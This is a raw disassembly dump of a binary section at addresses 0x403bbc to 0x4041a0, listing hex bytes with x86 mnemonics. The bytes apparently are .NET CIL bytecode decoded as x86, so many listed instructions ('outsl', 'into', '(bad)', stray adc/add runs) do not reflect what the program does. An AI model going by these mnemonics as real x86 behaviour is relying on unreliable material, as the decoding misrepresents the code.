  403bbc:	12 05 28 0e 00 00    	adc    0xe28,%al
  403bc2:	2b 00                	sub    (%eax),%eax
  403bc4:	dd 1d 04 00 00 02    	fstpl  0x2000004
  403bca:	7b 49                	jnp    0x403c15
  403bcc:	00 00                	add    %al,(%eax)
  403bce:	04 13                	add    $0x13,%al
  403bd0:	0e                   	push   %cs
  403bd1:	02 7c 49 00          	add    0x0(%ecx,%ecx,2),%bh
  403bd5:	00 04 fe             	add    %al,(%esi,%edi,8)
  403bd8:	15 1c 00 00 01       	adc    $0x100001c,%eax
  403bdd:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  403be3:	00 00                	add    %al,(%eax)
  403be5:	04 12                	add    $0x12,%al
  403be7:	0e                   	push   %cs
  403be8:	28 c3                	sub    %al,%bl
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0a 00                	or     (%eax),%al
  403bee:	02 7b 44             	add    0x44(%ebx),%bh
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	04 18                	add    $0x18,%al
  403bf5:	7d 13                	jge    0x403c0a
  403bf7:	00 00                	add    %al,(%eax)
  403bf9:	04 00                	add    $0x0,%al
  403bfb:	02 7b 44             	add    0x44(%ebx),%bh
  403bfe:	00 00                	add    %al,(%eax)
  403c00:	04 72                	add    $0x72,%al
  403c02:	db 39                	fstpt  (%ecx)
  403c04:	00 70 12             	add    %dh,0x12(%eax)
  403c07:	04 fe                	add    $0xfe,%al
  403c09:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  403c0e:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403c11:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  403c16:	c1 00 00             	roll   $0x0,(%eax)
  403c19:	0a 13                	or     (%ebx),%dl
  403c1b:	0f 12 0f             	movlps (%edi),%xmm1
  403c1e:	28 c2                	sub    %al,%dl
  403c20:	00 00                	add    %al,(%eax)
  403c22:	0a 2d 46 02 1b 25    	or     0x251b0246,%ch
  403c28:	0a 7d 40             	or     0x40(%ebp),%bh
  403c2b:	00 00                	add    %al,(%eax)
  403c2d:	04 02                	add    $0x2,%al
  403c2f:	11 0f                	adc    %ecx,(%edi)
  403c31:	7d 49                	jge    0x403c7c
  403c33:	00 00                	add    %al,(%eax)
  403c35:	04 02                	add    $0x2,%al
  403c37:	13 05 02 7c 41 00    	adc    0x417c02,%eax
  403c3d:	00 04 12             	add    %al,(%edx,%edx,1)
  403c40:	0f 12 05 28 0e 00 00 	movlps 0xe28,%xmm0
  403c47:	2b 00                	sub    (%eax),%eax
  403c49:	dd 98 03 00 00 02    	fstpl  0x2000003(%eax)
  403c4f:	7b 49                	jnp    0x403c9a
  403c51:	00 00                	add    %al,(%eax)
  403c53:	04 13                	add    $0x13,%al
  403c55:	0f 02 7c 49 00       	lar    0x0(%ecx,%ecx,2),%edi
  403c5a:	00 04 fe             	add    %al,(%esi,%edi,8)
  403c5d:	15 1c 00 00 01       	adc    $0x100001c,%eax
  403c62:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  403c68:	00 00                	add    %al,(%eax)
  403c6a:	04 12                	add    $0x12,%al
  403c6c:	0f 28 c3             	movaps %xmm3,%xmm0
  403c6f:	00 00                	add    %al,(%eax)
  403c71:	0a 00                	or     (%eax),%al
  403c73:	02 7b 44             	add    0x44(%ebx),%bh
  403c76:	00 00                	add    %al,(%eax)
  403c78:	04 72                	add    $0x72,%al
  403c7a:	27                   	daa
  403c7b:	3f                   	aas
  403c7c:	00 70 12             	add    %dh,0x12(%eax)
  403c7f:	04 fe                	add    $0xfe,%al
  403c81:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  403c86:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403c89:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  403c8e:	c1 00 00             	roll   $0x0,(%eax)
  403c91:	0a 13                	or     (%ebx),%dl
  403c93:	10 12                	adc    %dl,(%edx)
  403c95:	10 28                	adc    %ch,(%eax)
  403c97:	c2 00 00             	ret    $0x0
  403c9a:	0a 2d 46 02 1c 25    	or     0x251c0246,%ch
  403ca0:	0a 7d 40             	or     0x40(%ebp),%bh
  403ca3:	00 00                	add    %al,(%eax)
  403ca5:	04 02                	add    $0x2,%al
  403ca7:	11 10                	adc    %edx,(%eax)
  403ca9:	7d 49                	jge    0x403cf4
  403cab:	00 00                	add    %al,(%eax)
  403cad:	04 02                	add    $0x2,%al
  403caf:	13 05 02 7c 41 00    	adc    0x417c02,%eax
  403cb5:	00 04 12             	add    %al,(%edx,%edx,1)
  403cb8:	10 12                	adc    %dl,(%edx)
  403cba:	05 28 0e 00 00       	add    $0xe28,%eax
  403cbf:	2b 00                	sub    (%eax),%eax
  403cc1:	dd 20                	frstor (%eax)
  403cc3:	03 00                	add    (%eax),%eax
  403cc5:	00 02                	add    %al,(%edx)
  403cc7:	7b 49                	jnp    0x403d12
  403cc9:	00 00                	add    %al,(%eax)
  403ccb:	04 13                	add    $0x13,%al
  403ccd:	10 02                	adc    %al,(%edx)
  403ccf:	7c 49                	jl     0x403d1a
  403cd1:	00 00                	add    %al,(%eax)
  403cd3:	04 fe                	add    $0xfe,%al
  403cd5:	15 1c 00 00 01       	adc    $0x100001c,%eax
  403cda:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  403ce0:	00 00                	add    %al,(%eax)
  403ce2:	04 12                	add    $0x12,%al
  403ce4:	10 28                	adc    %ch,(%eax)
  403ce6:	c3                   	ret
  403ce7:	00 00                	add    %al,(%eax)
  403ce9:	0a 00                	or     (%eax),%al
  403ceb:	02 7b 44             	add    0x44(%ebx),%bh
  403cee:	00 00                	add    %al,(%eax)
  403cf0:	04 72                	add    $0x72,%al
  403cf2:	99                   	cltd
  403cf3:	3f                   	aas
  403cf4:	00 70 12             	add    %dh,0x12(%eax)
  403cf7:	04 fe                	add    $0xfe,%al
  403cf9:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  403cfe:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403d01:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  403d06:	c1 00 00             	roll   $0x0,(%eax)
  403d09:	0a 13                	or     (%ebx),%dl
  403d0b:	11 12                	adc    %edx,(%edx)
  403d0d:	11 28                	adc    %ebp,(%eax)
  403d0f:	c2 00 00             	ret    $0x0
  403d12:	0a 2d 46 02 1d 25    	or     0x251d0246,%ch
  403d18:	0a 7d 40             	or     0x40(%ebp),%bh
  403d1b:	00 00                	add    %al,(%eax)
  403d1d:	04 02                	add    $0x2,%al
  403d1f:	11 11                	adc    %edx,(%ecx)
  403d21:	7d 49                	jge    0x403d6c
  403d23:	00 00                	add    %al,(%eax)
  403d25:	04 02                	add    $0x2,%al
  403d27:	13 05 02 7c 41 00    	adc    0x417c02,%eax
  403d2d:	00 04 12             	add    %al,(%edx,%edx,1)
  403d30:	11 12                	adc    %edx,(%edx)
  403d32:	05 28 0e 00 00       	add    $0xe28,%eax
  403d37:	2b 00                	sub    (%eax),%eax
  403d39:	dd a8 02 00 00 02    	(bad) 0x2000002(%eax)
  403d3f:	7b 49                	jnp    0x403d8a
  403d41:	00 00                	add    %al,(%eax)
  403d43:	04 13                	add    $0x13,%al
  403d45:	11 02                	adc    %eax,(%edx)
  403d47:	7c 49                	jl     0x403d92
  403d49:	00 00                	add    %al,(%eax)
  403d4b:	04 fe                	add    $0xfe,%al
  403d4d:	15 1c 00 00 01       	adc    $0x100001c,%eax
  403d52:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  403d58:	00 00                	add    %al,(%eax)
  403d5a:	04 12                	add    $0x12,%al
  403d5c:	11 28                	adc    %ebp,(%eax)
  403d5e:	c3                   	ret
  403d5f:	00 00                	add    %al,(%eax)
  403d61:	0a 00                	or     (%eax),%al
  403d63:	02 7b 44             	add    0x44(%ebx),%bh
  403d66:	00 00                	add    %al,(%eax)
  403d68:	04 72                	add    $0x72,%al
  403d6a:	27                   	daa
  403d6b:	3f                   	aas
  403d6c:	00 70 12             	add    %dh,0x12(%eax)
  403d6f:	04 fe                	add    $0xfe,%al
  403d71:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  403d76:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403d79:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  403d7e:	c1 00 00             	roll   $0x0,(%eax)
  403d81:	0a 13                	or     (%ebx),%dl
  403d83:	12 12                	adc    (%edx),%dl
  403d85:	12 28                	adc    (%eax),%ch
  403d87:	c2 00 00             	ret    $0x0
  403d8a:	0a 2d 46 02 1e 25    	or     0x251e0246,%ch
  403d90:	0a 7d 40             	or     0x40(%ebp),%bh
  403d93:	00 00                	add    %al,(%eax)
  403d95:	04 02                	add    $0x2,%al
  403d97:	11 12                	adc    %edx,(%edx)
  403d99:	7d 49                	jge    0x403de4
  403d9b:	00 00                	add    %al,(%eax)
  403d9d:	04 02                	add    $0x2,%al
  403d9f:	13 05 02 7c 41 00    	adc    0x417c02,%eax
  403da5:	00 04 12             	add    %al,(%edx,%edx,1)
  403da8:	12 12                	adc    (%edx),%dl
  403daa:	05 28 0e 00 00       	add    $0xe28,%eax
  403daf:	2b 00                	sub    (%eax),%eax
  403db1:	dd 30                	fnsave (%eax)
  403db3:	02 00                	add    (%eax),%al
  403db5:	00 02                	add    %al,(%edx)
  403db7:	7b 49                	jnp    0x403e02
  403db9:	00 00                	add    %al,(%eax)
  403dbb:	04 13                	add    $0x13,%al
  403dbd:	12 02                	adc    (%edx),%al
  403dbf:	7c 49                	jl     0x403e0a
  403dc1:	00 00                	add    %al,(%eax)
  403dc3:	04 fe                	add    $0xfe,%al
  403dc5:	15 1c 00 00 01       	adc    $0x100001c,%eax
  403dca:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  403dd0:	00 00                	add    %al,(%eax)
  403dd2:	04 12                	add    $0x12,%al
  403dd4:	12 28                	adc    (%eax),%ch
  403dd6:	c3                   	ret
  403dd7:	00 00                	add    %al,(%eax)
  403dd9:	0a 00                	or     (%eax),%al
  403ddb:	02 7b 44             	add    0x44(%ebx),%bh
  403dde:	00 00                	add    %al,(%eax)
  403de0:	04 02                	add    $0x2,%al
  403de2:	7b 47                	jnp    0x403e2b
  403de4:	00 00                	add    %al,(%eax)
  403de6:	04 12                	add    $0x12,%al
  403de8:	04 fe                	add    $0xfe,%al
  403dea:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  403def:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403df2:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  403df7:	c1 00 00             	roll   $0x0,(%eax)
  403dfa:	0a 13                	or     (%ebx),%dl
  403dfc:	13 12                	adc    (%edx),%edx
  403dfe:	13 28                	adc    (%eax),%ebp
  403e00:	c2 00 00             	ret    $0x0
  403e03:	0a 2d 47 02 1f 09    	or     0x91f0247,%ch
  403e09:	25 0a 7d 40 00       	and    $0x407d0a,%eax
  403e0e:	00 04 02             	add    %al,(%edx,%eax,1)
  403e11:	11 13                	adc    %edx,(%ebx)
  403e13:	7d 49                	jge    0x403e5e
  403e15:	00 00                	add    %al,(%eax)
  403e17:	04 02                	add    $0x2,%al
  403e19:	13 05 02 7c 41 00    	adc    0x417c02,%eax
  403e1f:	00 04 12             	add    %al,(%edx,%edx,1)
  403e22:	13 12                	adc    (%edx),%edx
  403e24:	05 28 0e 00 00       	add    $0xe28,%eax
  403e29:	2b 00                	sub    (%eax),%eax
  403e2b:	dd b6 01 00 00 02    	fnsave 0x2000001(%esi)
  403e31:	7b 49                	jnp    0x403e7c
  403e33:	00 00                	add    %al,(%eax)
  403e35:	04 13                	add    $0x13,%al
  403e37:	13 02                	adc    (%edx),%eax
  403e39:	7c 49                	jl     0x403e84
  403e3b:	00 00                	add    %al,(%eax)
  403e3d:	04 fe                	add    $0xfe,%al
  403e3f:	15 1c 00 00 01       	adc    $0x100001c,%eax
  403e44:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  403e4a:	00 00                	add    %al,(%eax)
  403e4c:	04 12                	add    $0x12,%al
  403e4e:	13 28                	adc    (%eax),%ebp
  403e50:	c3                   	ret
  403e51:	00 00                	add    %al,(%eax)
  403e53:	0a 00                	or     (%eax),%al
  403e55:	00 02                	add    %al,(%edx)
  403e57:	14 7d                	adc    $0x7d,%al
  403e59:	47                   	inc    %edi
  403e5a:	00 00                	add    %al,(%eax)
  403e5c:	04 38                	add    $0x38,%al
  403e5e:	37                   	aaa
  403e5f:	01 00                	add    %eax,(%eax)
  403e61:	00 02                	add    %al,(%edx)
  403e63:	7b 43                	jnp    0x403ea8
  403e65:	00 00                	add    %al,(%eax)
  403e67:	04 6f                	add    $0x6f,%al
  403e69:	cd 00                	int    $0x0
  403e6b:	00 0a                	add    %cl,(%edx)
  403e6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403e6e:	ce                   	into
  403e6f:	00 00                	add    %al,(%eax)
  403e71:	0a 6f cf             	or     -0x31(%edi),%ch
  403e74:	00 00                	add    %al,(%eax)
  403e76:	0a 6f e4             	or     -0x1c(%edi),%ch
  403e79:	00 00                	add    %al,(%eax)
  403e7b:	0a 72 0b             	or     0xb(%edx),%dh
  403e7e:	40                   	inc    %eax
  403e7f:	00 70 6f             	add    %dh,0x6f(%eax)
  403e82:	d7                   	xlat   %ds:(%ebx)
  403e83:	00 00                	add    %al,(%eax)
  403e85:	0a 13                	or     (%ebx),%dl
  403e87:	14 11                	adc    $0x11,%al
  403e89:	14 39                	adc    $0x39,%al
  403e8b:	0a 01                	or     (%ecx),%al
  403e8d:	00 00                	add    %al,(%eax)
  403e8f:	00 02                	add    %al,(%edx)
  403e91:	7b 43                	jnp    0x403ed6
  403e93:	00 00                	add    %al,(%eax)
  403e95:	04 02                	add    $0x2,%al
  403e97:	7b 44                	jnp    0x403edd
  403e99:	00 00                	add    %al,(%eax)
  403e9b:	04 7b                	add    $0x7b,%al
  403e9d:	14 00                	adc    $0x0,%al
  403e9f:	00 04 14             	add    %al,(%esp,%edx,1)
  403ea2:	16                   	push   %ss
  403ea3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea4:	e5 00                	in     $0x0,%eax
  403ea6:	00 0a                	add    %cl,(%edx)
  403ea8:	00 02                	add    %al,(%edx)
  403eaa:	7b 44                	jnp    0x403ef0
  403eac:	00 00                	add    %al,(%eax)
  403eae:	04 72                	add    $0x72,%al
  403eb0:	15 40 00 70 12       	adc    $0x12700040,%eax
  403eb5:	04 fe                	add    $0xfe,%al
  403eb7:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  403ebc:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403ebf:	1e                   	push   %ds
  403ec0:	00 00                	add    %al,(%eax)
  403ec2:	06                   	push   %es
  403ec3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ec4:	c1 00 00             	roll   $0x0,(%eax)
  403ec7:	0a 13                	or     (%ebx),%dl
  403ec9:	15 12 15 28 c2       	adc    $0xc2281512,%eax
  403ece:	00 00                	add    %al,(%eax)
  403ed0:	0a 2d 47 02 1f 0a    	or     0xa1f0247,%ch
  403ed6:	25 0a 7d 40 00       	and    $0x407d0a,%eax
  403edb:	00 04 02             	add    %al,(%edx,%eax,1)
  403ede:	11 15 7d 49 00 00    	adc    %edx,0x497d
  403ee4:	04 02                	add    $0x2,%al
  403ee6:	13 05 02 7c 41 00    	adc    0x417c02,%eax
  403eec:	00 04 12             	add    %al,(%edx,%edx,1)
  403eef:	15 12 05 28 0e       	adc    $0xe280512,%eax
  403ef4:	00 00                	add    %al,(%eax)
  403ef6:	2b 00                	sub    (%eax),%eax
  403ef8:	dd e9                	fucomp %st(1)
  403efa:	00 00                	add    %al,(%eax)
  403efc:	00 02                	add    %al,(%edx)
  403efe:	7b 49                	jnp    0x403f49
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 13                	add    $0x13,%al
  403f04:	15 02 7c 49 00       	adc    $0x497c02,%eax
  403f09:	00 04 fe             	add    %al,(%esi,%edi,8)
  403f0c:	15 1c 00 00 01       	adc    $0x100001c,%eax
  403f11:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  403f17:	00 00                	add    %al,(%eax)
  403f19:	04 12                	add    $0x12,%al
  403f1b:	15 28 c3 00 00       	adc    $0xc328,%eax
  403f20:	0a 00                	or     (%eax),%al
  403f22:	02 7b 44             	add    0x44(%ebx),%bh
  403f25:	00 00                	add    %al,(%eax)
  403f27:	04 72                	add    $0x72,%al
  403f29:	5f                   	pop    %edi
  403f2a:	40                   	inc    %eax
  403f2b:	00 70 12             	add    %dh,0x12(%eax)
  403f2e:	04 fe                	add    $0xfe,%al
  403f30:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  403f35:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403f38:	1e                   	push   %ds
  403f39:	00 00                	add    %al,(%eax)
  403f3b:	06                   	push   %es
  403f3c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f3d:	c1 00 00             	roll   $0x0,(%eax)
  403f40:	0a 13                	or     (%ebx),%dl
  403f42:	16                   	push   %ss
  403f43:	12 16                	adc    (%esi),%dl
  403f45:	28 c2                	sub    %al,%dl
  403f47:	00 00                	add    %al,(%eax)
  403f49:	0a 2d 44 02 1f 0b    	or     0xb1f0244,%ch
  403f4f:	25 0a 7d 40 00       	and    $0x407d0a,%eax
  403f54:	00 04 02             	add    %al,(%edx,%eax,1)
  403f57:	11 16                	adc    %edx,(%esi)
  403f59:	7d 49                	jge    0x403fa4
  403f5b:	00 00                	add    %al,(%eax)
  403f5d:	04 02                	add    $0x2,%al
  403f5f:	13 05 02 7c 41 00    	adc    0x417c02,%eax
  403f65:	00 04 12             	add    %al,(%edx,%edx,1)
  403f68:	16                   	push   %ss
  403f69:	12 05 28 0e 00 00    	adc    0xe28,%al
  403f6f:	2b 00                	sub    (%eax),%eax
  403f71:	de 73 02             	fidivs 0x2(%ebx)
  403f74:	7b 49                	jnp    0x403fbf
  403f76:	00 00                	add    %al,(%eax)
  403f78:	04 13                	add    $0x13,%al
  403f7a:	16                   	push   %ss
  403f7b:	02 7c 49 00          	add    0x0(%ecx,%ecx,2),%bh
  403f7f:	00 04 fe             	add    %al,(%esi,%edi,8)
  403f82:	15 1c 00 00 01       	adc    $0x100001c,%eax
  403f87:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  403f8d:	00 00                	add    %al,(%eax)
  403f8f:	04 12                	add    $0x12,%al
  403f91:	16                   	push   %ss
  403f92:	28 c3                	sub    %al,%bl
  403f94:	00 00                	add    %al,(%eax)
  403f96:	0a 00                	or     (%eax),%al
  403f98:	00 00                	add    %al,(%eax)
  403f9a:	de 28                	fisubrs (%eax)
  403f9c:	13 17                	adc    (%edi),%edx
  403f9e:	02 1f                	add    (%edi),%bl
  403fa0:	fe                   	(bad)
  403fa1:	7d 40                	jge    0x403fe3
  403fa3:	00 00                	add    %al,(%eax)
  403fa5:	04 02                	add    $0x2,%al
  403fa7:	14 7d                	adc    $0x7d,%al
  403fa9:	45                   	inc    %ebp
  403faa:	00 00                	add    %al,(%eax)
  403fac:	04 02                	add    $0x2,%al
  403fae:	14 7d                	adc    $0x7d,%al
  403fb0:	46                   	inc    %esi
  403fb1:	00 00                	add    %al,(%eax)
  403fb3:	04 02                	add    $0x2,%al
  403fb5:	7c 41                	jl     0x403ff8
  403fb7:	00 00                	add    %al,(%eax)
  403fb9:	04 11                	add    $0x11,%al
  403fbb:	17                   	pop    %ss
  403fbc:	28 d9                	sub    %bl,%cl
  403fbe:	00 00                	add    %al,(%eax)
  403fc0:	0a 00                	or     (%eax),%al
  403fc2:	de 22                	fisubs (%edx)
  403fc4:	02 1f                	add    (%edi),%bl
  403fc6:	fe                   	(bad)
  403fc7:	7d 40                	jge    0x404009
  403fc9:	00 00                	add    %al,(%eax)
  403fcb:	04 02                	add    $0x2,%al
  403fcd:	14 7d                	adc    $0x7d,%al
  403fcf:	45                   	inc    %ebp
  403fd0:	00 00                	add    %al,(%eax)
  403fd2:	04 02                	add    $0x2,%al
  403fd4:	14 7d                	adc    $0x7d,%al
  403fd6:	46                   	inc    %esi
  403fd7:	00 00                	add    %al,(%eax)
  403fd9:	04 02                	add    $0x2,%al
  403fdb:	7c 41                	jl     0x40401e
  403fdd:	00 00                	add    %al,(%eax)
  403fdf:	04 28                	add    $0x28,%al
  403fe1:	da 00                	fiaddl (%eax)
  403fe3:	00 0a                	add    %cl,(%edx)
  403fe5:	00 2a                	add    %ch,(%edx)
  403fe7:	00 41 1c             	add    %al,0x1c(%ecx)
  403fea:	00 00                	add    %al,(%eax)
  403fec:	00 00                	add    %al,(%eax)
  403fee:	00 00                	add    %al,(%eax)
  403ff0:	07                   	pop    %es
  403ff1:	00 00                	add    %al,(%eax)
  403ff3:	00 f5                	add    %dh,%ch
  403ff5:	07                   	pop    %es
  403ff6:	00 00                	add    %al,(%eax)
  403ff8:	fc                   	cld
  403ff9:	07                   	pop    %es
  403ffa:	00 00                	add    %al,(%eax)
  403ffc:	28 00                	sub    %al,(%eax)
  403ffe:	00 00                	add    %al,(%eax)
  404000:	1d 00 00 01 06       	sbb    $0x6010000,%eax
  404005:	2a 22                	sub    (%edx),%ah
  404007:	02 28                	add    (%eax),%ch
  404009:	22 00                	and    (%eax),%al
  40400b:	00 0a                	add    %cl,(%edx)
  40400d:	00 2a                	add    %ch,(%edx)
  40400f:	00 1b                	add    %bl,(%ebx)
  404011:	30 06                	xor    %al,(%esi)
  404013:	00 85 0a 00 00 16    	add    %al,0x1600000a(%ebp)
  404019:	00 00                	add    %al,(%eax)
  40401b:	11 02                	adc    %eax,(%edx)
  40401d:	7b 4b                	jnp    0x40406a
  40401f:	00 00                	add    %al,(%eax)
  404021:	04 0a                	add    $0xa,%al
  404023:	06                   	push   %es
  404024:	45                   	inc    %ebp
  404025:	09 00                	or     %eax,(%eax)
  404027:	00 00                	add    %al,(%eax)
  404029:	02 00                	add    (%eax),%al
  40402b:	00 00                	add    %al,(%eax)
  40402d:	04 00                	add    $0x0,%al
  40402f:	00 00                	add    %al,(%eax)
  404031:	09 00                	or     %eax,(%eax)
  404033:	00 00                	add    %al,(%eax)
  404035:	09 00                	or     %eax,(%eax)
  404037:	00 00                	add    %al,(%eax)
  404039:	09 00                	or     %eax,(%eax)
  40403b:	00 00                	add    %al,(%eax)
  40403d:	09 00                	or     %eax,(%eax)
  40403f:	00 00                	add    %al,(%eax)
  404041:	09 00                	or     %eax,(%eax)
  404043:	00 00                	add    %al,(%eax)
  404045:	09 00                	or     %eax,(%eax)
  404047:	00 00                	add    %al,(%eax)
  404049:	0e                   	push   %cs
  40404a:	00 00                	add    %al,(%eax)
  40404c:	00 2b                	add    %ch,(%ebx)
  40404e:	11 2b                	adc    %ebp,(%ebx)
  404050:	7d 38                	jge    0x40408a
  404052:	2a 01                	sub    (%ecx),%al
  404054:	00 00                	add    %al,(%eax)
  404056:	38 9f 01 00 00 38    	cmp    %bl,0x38000001(%edi)
  40405c:	b1 09                	mov    $0x9,%cl
  40405e:	00 00                	add    %al,(%eax)
  404060:	00 02                	add    %al,(%edx)
  404062:	7b 4f                	jnp    0x4040b3
  404064:	00 00                	add    %al,(%eax)
  404066:	04 72                	add    $0x72,%al
  404068:	87 40 00             	xchg   %eax,0x0(%eax)
  40406b:	70 02                	jo     0x40406f
  40406d:	7b 4d                	jnp    0x4040bc
  40406f:	00 00                	add    %al,(%eax)
  404071:	04 74                	add    $0x74,%al
  404073:	24 00                	and    $0x0,%al
  404075:	00 01                	add    %al,(%ecx)
  404077:	6f                   	outsl  %ds:(%esi),(%dx)
  404078:	e6 00                	out    %al,$0x0
  40407a:	00 0a                	add    %cl,(%edx)
  40407c:	0c 12                	or     $0x12,%al
  40407e:	02 28                	add    (%eax),%ch
  404080:	dc 00                	faddl  (%eax)
  404082:	00 0a                	add    %cl,(%edx)
  404084:	28 71 00             	sub    %dh,0x0(%ecx)
  404087:	00 0a                	add    %cl,(%edx)
  404089:	12 03                	adc    (%ebx),%al
  40408b:	fe                   	(bad)
  40408c:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  404091:	09 28                	or     %ebp,(%eax)
  404093:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  404098:	c1 00 00             	roll   $0x0,(%eax)
  40409b:	0a 0b                	or     (%ebx),%cl
  40409d:	12 01                	adc    (%ecx),%al
  40409f:	28 c2                	sub    %al,%dl
  4040a1:	00 00                	add    %al,(%eax)
  4040a3:	0a 2d 44 02 16 25    	or     0x25160244,%ch
  4040a9:	0a 7d 4b             	or     0x4b(%ebp),%bh
  4040ac:	00 00                	add    %al,(%eax)
  4040ae:	04 02                	add    $0x2,%al
  4040b0:	07                   	pop    %es
  4040b1:	7d 5d                	jge    0x404110
  4040b3:	00 00                	add    %al,(%eax)
  4040b5:	04 02                	add    $0x2,%al
  4040b7:	13 04 02             	adc    (%edx,%eax,1),%eax
  4040ba:	7c 4c                	jl     0x404108
  4040bc:	00 00                	add    %al,(%eax)
  4040be:	04 12                	add    $0x12,%al
  4040c0:	01 12                	add    %edx,(%edx)
  4040c2:	04 28                	add    $0x28,%al
  4040c4:	10 00                	adc    %al,(%eax)
  4040c6:	00 2b                	add    %ch,(%ebx)
  4040c8:	00 dd                	add    %bl,%ch
  4040ca:	d2 09                	rorb   %cl,(%ecx)
  4040cc:	00 00                	add    %al,(%eax)
  4040ce:	02 7b 5d             	add    0x5d(%ebx),%bh
  4040d1:	00 00                	add    %al,(%eax)
  4040d3:	04 0b                	add    $0xb,%al
  4040d5:	02 7c 5d 00          	add    0x0(%ebp,%ebx,2),%bh
  4040d9:	00 04 fe             	add    %al,(%esi,%edi,8)
  4040dc:	15 1c 00 00 01       	adc    $0x100001c,%eax
  4040e1:	02 15 25 0a 7d 4b    	add    0x4b7d0a25,%dl
  4040e7:	00 00                	add    %al,(%eax)
  4040e9:	04 12                	add    $0x12,%al
  4040eb:	01 28                	add    %ebp,(%eax)
  4040ed:	c3                   	ret
  4040ee:	00 00                	add    %al,(%eax)
  4040f0:	0a 00                	or     (%eax),%al
  4040f2:	02 02                	add    (%edx),%al
  4040f4:	7b 4e                	jnp    0x404144
  4040f6:	00 00                	add    %al,(%eax)
  4040f8:	04 6f                	add    $0x6f,%al
  4040fa:	cd 00                	int    $0x0
  4040fc:	00 0a                	add    %cl,(%edx)
  4040fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ff:	ce                   	into
  404100:	00 00                	add    %al,(%eax)
  404102:	0a 6f cf             	or     -0x31(%edi),%ch
  404105:	00 00                	add    %al,(%eax)
  404107:	0a 6f 16             	or     0x16(%edi),%ch
  40410a:	00 00                	add    %al,(%eax)
  40410c:	0a 7d 50             	or     0x50(%ebp),%bh
  40410f:	00 00                	add    %al,(%eax)
  404111:	04 02                	add    $0x2,%al
  404113:	7b 50                	jnp    0x404165
  404115:	00 00                	add    %al,(%eax)
  404117:	04 02                	add    $0x2,%al
  404119:	7b 4f                	jnp    0x40416a
  40411b:	00 00                	add    %al,(%eax)
  40411d:	04 7b                	add    $0x7b,%al
  40411f:	1f                   	pop    %ds
  404120:	00 00                	add    %al,(%eax)
  404122:	04 6f                	add    $0x6f,%al
  404124:	d7                   	xlat   %ds:(%ebx)
  404125:	00 00                	add    %al,(%eax)
  404127:	0a 13                	or     (%ebx),%dl
  404129:	05 11 05 39 31       	add    $0x31390511,%eax
  40412e:	09 00                	or     %eax,(%eax)
  404130:	00 00                	add    %al,(%eax)
  404132:	02 7b 4e             	add    0x4e(%ebx),%bh
  404135:	00 00                	add    %al,(%eax)
  404137:	04 12                	add    $0x12,%al
  404139:	07                   	pop    %es
  40413a:	fe                   	(bad)
  40413b:	15 37 00 00 01       	adc    $0x1000037,%eax
  404140:	11 07                	adc    %eax,(%edi)
  404142:	6f                   	outsl  %ds:(%esi),(%dx)
  404143:	e7 00                	out    %eax,$0x0
  404145:	00 0a                	add    %cl,(%edx)
  404147:	6f                   	outsl  %ds:(%esi),(%dx)
  404148:	e8 00 00 0a 13       	call   0x134a414d
  40414d:	06                   	push   %es
  40414e:	12 06                	adc    (%esi),%al
  404150:	28 e9                	sub    %ch,%cl
  404152:	00 00                	add    %al,(%eax)
  404154:	0a 2d 46 02 17 25    	or     0x25170246,%ch
  40415a:	0a 7d 4b             	or     0x4b(%ebp),%bh
  40415d:	00 00                	add    %al,(%eax)
  40415f:	04 02                	add    $0x2,%al
  404161:	11 06                	adc    %eax,(%esi)
  404163:	7d 5e                	jge    0x4041c3
  404165:	00 00                	add    %al,(%eax)
  404167:	04 02                	add    $0x2,%al
  404169:	13 04 02             	adc    (%edx,%eax,1),%eax
  40416c:	7c 4c                	jl     0x4041ba
  40416e:	00 00                	add    %al,(%eax)
  404170:	04 12                	add    $0x12,%al
  404172:	06                   	push   %es
  404173:	12 04 28             	adc    (%eax,%ebp,1),%al
  404176:	11 00                	adc    %eax,(%eax)
  404178:	00 2b                	add    %ch,(%ebx)
  40417a:	00 dd                	add    %bl,%ch
  40417c:	20 09                	and    %cl,(%ecx)
  40417e:	00 00                	add    %al,(%eax)
  404180:	02 7b 5e             	add    0x5e(%ebx),%bh
  404183:	00 00                	add    %al,(%eax)
  404185:	04 13                	add    $0x13,%al
  404187:	06                   	push   %es
  404188:	02 7c 5e 00          	add    0x0(%esi,%ebx,2),%bh
  40418c:	00 04 fe             	add    %al,(%esi,%edi,8)
  40418f:	15 0d 00 00 1b       	adc    $0x1b00000d,%eax
  404194:	02 15 25 0a 7d 4b    	add    0x4b7d0a25,%dl
  40419a:	00 00                	add    %al,(%eax)
  40419c:	04 02                	add    $0x2,%al
  40419e:	12 06                	adc    (%esi),%al
